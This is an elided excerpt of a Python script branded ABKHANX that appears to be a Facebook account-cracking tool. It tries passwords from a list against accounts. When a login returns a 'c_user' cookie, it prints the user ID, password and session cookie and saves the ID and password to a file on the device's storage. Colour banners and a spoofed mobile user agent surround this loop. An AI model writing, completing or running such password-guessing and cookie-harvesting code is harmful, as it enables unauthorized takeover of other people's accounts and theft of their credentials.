...
ha = current.day
today = date.today()
#ABKHANX2 = "\033[1;33m➤\033[1;32m➤\x1b[0m"
...
try:
    ...
    print('\x1b[1;92m[<\>]\x1b[1;97m \x1b[1;96mABKHANX')
...
for x in range(10):
    ...
    l='Mobile WVGA SMM-ABKHANX/1.2.0 OPN-B'
...
--------------------------------------------------
[•] \033[1;32mVERSION    :\033[1;32m 1.1.1 \033[1;32m
--------------------------------------------------
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[151:166]
                #os.system("play-audio ABKHANX_OK.mp3")
                print('\033[1;92m[ABKHANX-OK] '+uid+' | '+ps+'\033[0;97m')
                #print(f'{B}[NUMBER📳] {K}'+uid+'  ')
                print(f'{B}[COOKIE💉] {H}'+coki)
                cek_apk(session,coki)
                open('/sdcard/ABKHANX-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
                break
            else:
                continue
        loop+=1
        animasi = random.choice(["\x1b[1;91mABKHANX","\x1b[1;92mABKHANX","\x1b[1;93mABKHANX","\x1b[1;94mABKHANX","\x1b[1;95mABKHANX","\x1b[1;96mABKHANX","\x1b[1;97mABKHANX","\x1b[1;91mABKHANX","\x1b[1;92mABKHANX","\x1b[1;93mABKHANX","\x1b[1;94mABKHANX","\x1b[1;95mABKHANX","\x1b[1;96mABKHANX"])
